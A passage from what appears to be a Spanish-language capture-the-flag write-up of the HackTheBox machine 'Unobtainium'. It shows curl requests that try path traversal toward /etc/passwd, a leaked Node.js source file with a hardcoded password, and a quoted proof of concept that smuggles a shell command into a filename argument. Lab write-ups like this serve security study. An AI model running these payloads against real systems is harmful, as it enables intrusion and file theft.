</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Al principio se lleva a cabo una autentificaciÃ³n un usuario y contraseÃ±a y despuÃ©s se manda el mensaje.</p><p><strong>Message Log:</strong></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/log2_hu33281d088146d3156584856089629f5f_85082_4567adee51c82fbd8665d65ab373dfcb.webp 480w, /writeups/hackthebox/unobtainium/images/log2_hu33281d088146d3156584856089629f5f_85082_629410537f4132c59fcf8e4846ba8329.webp 640w, /writeups/hackthebox/unobtainium/images/log2_hu33281d088146d3156584856089629f5f_85082_ffeebd9041f582c2109df114d1a19b61.webp 800w, /writeups/hackthebox/unobtainium/images/log2_hu33281d088146d3156584856089629f5f_85082_114fe11bddec0152253675d41e542cae.webp 1024w" fetchpriority=low height=900 id=h-rh-i-5 src=/writeups/hackthebox/unobtainium/images/log2_hu33281d088146d3156584856089629f5f_85082_2729c4eecc99602c77dde5c8ce562b34.webp width=1600></p><p>Simplemente, se hace una peticiÃ³n GET a unobtainium.htb:31337, y en la respuesta vemos el log de los mensajes enviados al servidor</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;icon&#34;</span><span class=p>:</span> <span class=s2>&#34;__&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;text&#34;</span><span class=p>:</span> <span class=s2>&#34;Testing3&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;timestamp&#34;</span><span class=p>:</span> <span class=mi>1718709973974</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;userName&#34;</span><span class=p>:</span> <span class=s2>&#34;felamos&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>Todo:</strong></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/todo2_hued80fd40a8b888a0c72c055d400c5287_102205_caa9c422338c8e7e611aa496bb2e72f4.webp 480w, /writeups/hackthebox/unobtainium/images/todo2_hued80fd40a8b888a0c72c055d400c5287_102205_48466d27fd18a339658c7a1604de7593.webp 640w, /writeups/hackthebox/unobtainium/images/todo2_hued80fd40a8b888a0c72c055d400c5287_102205_bfc058998edd932b4206fe8316b48434.webp 800w, /writeups/hackthebox/unobtainium/images/todo2_hued80fd40a8b888a0c72c055d400c5287_102205_7708f64b3f6e7bb1002c56d71f5ad0b0.webp 1024w" fetchpriority=low height=900 id=h-rh-i-6 src=/writeups/hackthebox/unobtainium/images/todo2_hued80fd40a8b888a0c72c055d400c5287_102205_46bacf7bc9fc7271da8cebc29ef734a5.webp width=1600></p><p>En la secciÃ³n de todo, se hace una peticiÃ³n con el mÃ©todo POST a unobtainium.htb:31337/todo, y como data ponemos lo que parece ser el nombre de un archivo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;auth&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;felamos&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;Winter2021&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;filename&#34;</span><span class=p>:</span> <span class=s2>&#34;todo.txt&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>En la respuesta, vemos lo que parece ser el contenido de dicho archivo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;ok&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;content&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;1. Create administrator zone.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;2. Update Node.js API Server.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;3. Add Login functionality.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;4. Complete Get Messages feature.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;5. Complete ToDo feature.&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;7. Improve security&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Con esto lo primero que se nos puede pasar por la cabeza es un lfi</p><pre tabindex=0><code>curl -s -X POST http://unobtainium.htb:31337/todo -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;auth&#34;:{&#34;name&#34;:&#34;felamos&#34;,&#34;password&#34;:&#34;Winter2021&#34;},&#34;filename&#34;:&#34;/etc/passwd&#34;}&#39;

curl -s -X POST http://unobtainium.htb:31337/todo -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;auth&#34;:{&#34;name&#34;:&#34;felamos&#34;,&#34;password&#34;:&#34;Winter2021&#34;},&#34;filename&#34;:&#34;../../../../../../../etc/passwd&#34;}&#39;

curl -s -X POST http://unobtainium.htb:31337/todo -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;auth&#34;:{&#34;name&#34;:&#34;felamos&#34;,&#34;password&#34;:&#34;Winter2021&#34;},&#34;filename&#34;:&#34;....//....//....//....//....//....//....//etc/passwd&#34;}&#39;
</code></pre><p>Pero no conseguimos ver el /etc/passwd</p><p>Si recordamos, nmap dijo que estÃ¡bamos ante un NodeJS en el puerto 31337, asÃ­ que en la raÃ­z del proyecto tiene que haber un index.js, vamos a intentar verlo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl -s -X POST http://unobtainium.htb:31337/todo -H <span class=s1>&#39;Content-Type: application/json&#39;</span> -d <span class=s1>&#39;{&#34;auth&#34;:{&#34;name&#34;:&#34;felamos&#34;,&#34;password&#34;:&#34;Winter2021&#34;},&#34;filename&#34;:&#34;index.js&#34;}&#39;</span>   
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;ok&#34;</span>:true,<span class=s2>&#34;content&#34;</span>:<span class=s2>&#34;var root = require(\&#34;google-cloudstorage-commands\&#34;);\nconst express = require(&#39;express&#39;);\nconst { exec } = require(\&#34;child_process\&#34;);\nconst bodyParser = require(&#39;body-parser&#39;);\nconst _ = require(&#39;lodash&#39;);\nconst app = express();\nvar fs = require(&#39;fs&#39;);\n\nconst users = [\n  {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},\n  {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true},\n];\n\nlet messages = [];\nlet lastId = 1;\n\nfunction findUser(auth) {\n  return users.find((u) =&gt;\n    u.name === auth.name &amp;&amp;\n    u.password === auth.password);\n}\n\napp.use(bodyParser.json());\n\napp.get(&#39;/&#39;, (req, res) =&gt; {\n  res.send(messages);\n});\n\napp.put(&#39;/&#39;, (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n\n  if (!user) {\n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n    return;\n  }\n\n  const message = {\n    icon: &#39;__&#39;,\n  };\n\n  _.merge(message, req.body.message, {\n    id: lastId++,\n    timestamp: Date.now(),\n    userName: user.name,\n  });\n\n  messages.push(message);\n  res.send({ok: true});\n});\n\napp.delete(&#39;/&#39;, (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n\n  if (!user || !user.canDelete) {\n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n    return;\n  }\n\n  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);\n  res.send({ok: true});\n});\napp.post(&#39;/upload&#39;, (req, res) =&gt; {\n  const user = findUser(req.body.auth || {});\n  if (!user || !user.canUpload) {\n    res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n    return;\n  }\n\n\n  filename = req.body.filename;\n  root.upload(\&#34;./\&#34;,filename, true);\n  res.send({ok: true, Uploaded_File: filename});\n});\n\napp.post(&#39;/todo&#39;, (req, res) =&gt; {\n        const user = findUser(req.body.auth || {});\n        if (!user) {\n                res.status(403).send({ok: false, error: &#39;Access denied&#39;});\n                return;\n        }\n\n        filename = req.body.filename;\n        testFolder = \&#34;/usr/src/app\&#34;;\n        fs.readdirSync(testFolder).forEach(file =&gt; {\n                if (file.indexOf(filename) &gt; -1) {\n                        var buffer = fs.readFileSync(filename).toString();\n                        res.send({ok: true, content: buffer});\n                }\n        });\n});\n\napp.listen(3000);\nconsole.log(&#39;Listening on port 3000...&#39;);\n&#34;</span><span class=o>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>root</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;google-cloudstorage-commands&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>exec</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;child_process&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>bodyParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;body-parser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>_</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;lodash&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>users</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span><span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;felamos&#39;</span><span class=p>,</span> <span class=nx>password</span><span class=o>:</span> <span class=s1>&#39;Winter2021&#39;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span><span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=nx>password</span><span class=o>:</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>().</span><span class=nx>toString</span><span class=p>(</span><span class=mi>32</span><span class=p>),</span> <span class=nx>canDelete</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>canUpload</span><span class=o>:</span> <span class=kc>true</span><span class=p>},</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>messages</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>lastId</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>auth</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>users</span><span class=p>.</span><span class=nx>find</span><span class=p>((</span><span class=nx>u</span><span class=p>)</span> <span class=p>=&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nx>u</span><span class=p>.</span><span class=nx>name</span> <span class=o>===</span> <span class=nx>auth</span><span class=p>.</span><span class=nx>name</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>    <span class=nx>u</span><span class=p>.</span><span class=nx>password</span> <span class=o>===</span> <span class=nx>auth</span><span class=p>.</span><span class=nx>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>bodyParser</span><span class=p>.</span><span class=nx>json</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>messages</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>put</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>message</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>icon</span><span class=o>:</span> <span class=s1>&#39;__&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>_</span><span class=p>.</span><span class=nx>merge</span><span class=p>(</span><span class=nx>message</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>message</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>id</span><span class=o>:</span> <span class=nx>lastId</span><span class=o>++</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>timestamp</span><span class=o>:</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>    <span class=nx>userName</span><span class=o>:</span> <span class=nx>user</span><span class=p>.</span><span class=nx>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>messages</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=k>delete</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span> <span class=o>||</span> <span class=o>!</span><span class=nx>user</span><span class=p>.</span><span class=nx>canDelete</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>messages</span> <span class=o>=</span> <span class=nx>messages</span><span class=p>.</span><span class=nx>filter</span><span class=p>((</span><span class=nx>m</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=nx>m</span><span class=p>.</span><span class=nx>id</span> <span class=o>!==</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>messageId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span> <span class=o>||</span> <span class=o>!</span><span class=nx>user</span><span class=p>.</span><span class=nx>canUpload</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>filename</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>root</span><span class=p>.</span><span class=nx>upload</span><span class=p>(</span><span class=s2>&#34;./&#34;</span><span class=p>,</span> <span class=nx>filename</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>Uploaded_File</span><span class=o>:</span> <span class=nx>filename</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/todo&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>filename</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>testFolder</span> <span class=o>=</span> <span class=s2>&#34;/usr/src/app&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>fs</span><span class=p>.</span><span class=nx>readdirSync</span><span class=p>(</span><span class=nx>testFolder</span><span class=p>).</span><span class=nx>forEach</span><span class=p>(</span><span class=nx>file</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>file</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>filename</span><span class=p>)</span> <span class=o>&gt;</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=kd>var</span> <span class=nx>buffer</span> <span class=o>=</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFileSync</span><span class=p>(</span><span class=nx>filename</span><span class=p>).</span><span class=nx>toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>content</span><span class=o>:</span> <span class=nx>buffer</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=mi>3000</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Listening on port 3000...&#39;</span><span class=p>);</span>
</span></span></code></pre></div><p>Ahora ya tenemos mucha mÃ¡s informaciÃ³n sobre la aplicaciÃ³n.</p><p>Al principio del cÃ³digo se declaran 2 usuarios:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>users</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span><span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;felamos&#39;</span><span class=p>,</span> <span class=nx>password</span><span class=o>:</span> <span class=s1>&#39;Winter2021&#39;</span><span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span><span class=nx>name</span><span class=o>:</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=nx>password</span><span class=o>:</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>().</span><span class=nx>toString</span><span class=p>(</span><span class=mi>32</span><span class=p>),</span> <span class=nx>canDelete</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>canUpload</span><span class=o>:</span> <span class=kc>true</span><span class=p>},</span>
</span></span><span class=line><span class=cl><span class=p>];</span>
</span></span></code></pre></div><p>Felamos ya lo conocÃ­amos, pero aparece un usuario nuevo, admin, la password no la podemos ver, ya que es random y se genera durante la ejecuciÃ³n. Aparte del nombre y la contraseÃ±a, vemos que hay 2 &lsquo;roles&rsquo;: canDelete y canUpload, el admin, tiene los 2 en True, pero Felamos, no tiene ninguno de los 2.</p><p>Encontramos una funciÃ³n nueva, upload, esta funciÃ³n solo la pueden hacer los usuarios con rol can Upload.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span><span class=p>(</span><span class=s1>&#39;/upload&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=nx>findUser</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>auth</span> <span class=o>||</span> <span class=p>{});</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>user</span> <span class=o>||</span> <span class=o>!</span><span class=nx>user</span><span class=p>.</span><span class=nx>canUpload</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>false</span><span class=p>,</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Access denied&#39;</span><span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>filename</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>filename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nx>root</span><span class=p>.</span><span class=nx>upload</span><span class=p>(</span><span class=s2>&#34;./&#34;</span><span class=p>,</span> <span class=nx>filename</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>({</span><span class=nx>ok</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=nx>Uploaded_File</span><span class=o>:</span> <span class=nx>filename</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>El archivo se sube con root.upload, pero de donde sale eso?</p><p>En la parte superior del cÃ³digo se importa <code>google-cloudstorage-commands</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>root</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;google-cloudstorage-commands&#34;</span><span class=p>);</span>
</span></span></code></pre></div><p>Con una bÃºsqueda en internet, descubrimos que es vulnerable a un OS command injection: https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431</p><p>Este es el PoC:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>root</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;google-cloudstorage-commands&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>root</span><span class=p>.</span><span class=nx>upload</span><span class=p>(</span><span class=s2>&#34;./&#34;</span><span class=p>,</span><span class=s2>&#34;&amp; touch JHU&#34;</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
